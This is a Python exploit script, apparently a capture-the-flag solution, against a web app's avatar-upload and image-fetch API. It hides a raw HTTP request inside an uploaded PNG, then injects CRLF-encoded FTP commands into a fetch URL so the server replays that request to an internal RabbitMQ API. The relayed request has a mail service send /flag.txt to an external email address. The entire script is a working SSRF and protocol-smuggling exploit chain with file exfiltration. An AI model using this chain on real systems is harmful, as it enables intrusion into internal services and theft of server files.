import requests
import base64
import urllib

#Joint effort by mementomori and Jazzy

API_URL = 'http://contrived.pwni.ng/api'
AUTH = 'e8d880e6-9b42-40e9-8b11-bc79fd6c083c'

SSRF_HOST, SSRF_PORT = '172.32.56.72', 15672
SSRF_BODY = '''POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
Host: rabbit:15672
Authorization: Basic dGVzdDp0ZXN0
User-Agent: curl/7.52.1
Accept: */*
Content-Length: 336
Content-Type: application/json

{"vhost": "/", "name": "amq.default", "properties": {"delivery_mode": 1, "headers": {}}, "routing_key": "email", "delivery_mode": "1", "payload": "{\\"text\\": \\"pepega\\", \\"to\\": \\"youremail@gmail.com\\", \\"attachments\\": [{\\"filename\\": \\"flag.txt\\", \\"path\\": \\"/flag.txt\\"}]}", "headers": {}, "props": {}, "payload_encoding": "string"}

'''.replace('\n', '\r\n')*800

PNG_HEADER = '\x89\x50\x4e\x47'

s = requests.Session()
s.cookies.update({'authentication': AUTH})

def upload_avatar(contents):
	r = s.post(API_URL + '/profile', json = {'image': base64.b64encode(contents)})
	assert r.content == 'Profile updated'

def get_uuid():
	upload_avatar(PNG_HEADER)
	r = s.get(API_URL + '/self')
	return r.json()['profile'].split('/')[4]

def do_ssrf(host, port, body):
	uuid = get_uuid()
	upload_avatar(PNG_HEADER + body)
	print uuid
	ftp_cmds = [
		'PORT {},{},{}'.format(host.replace('.', ','), port >> 8, port & 0xff),
		'CWD user',
		'CWD {}'.format(uuid),
		'REST 4',
		'RETR profile.png',
	]
	url = 'ftp://anonymous%0d%0a{}:pass@ftp/'.format(urllib.quote('\r\n'.join(ftp_cmds)))
	r = requests.get(API_URL + '/image?url=' + urllib.quote(url))

do_ssrf(SSRF_HOST, SSRF_PORT, SSRF_BODY)
